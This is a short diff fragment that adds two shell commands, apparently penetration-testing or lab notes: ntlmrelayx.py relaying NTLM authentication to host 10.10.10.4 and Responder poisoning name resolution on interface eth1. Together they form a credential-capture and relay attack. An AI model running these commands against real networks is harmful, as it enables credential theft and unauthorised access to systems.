@@ -1,0 +1,3 @@
+sudo ntlmrelayx.py -t 10.10.10.4 -smb2support
+
+sudo responder -I eth1 -rdwv
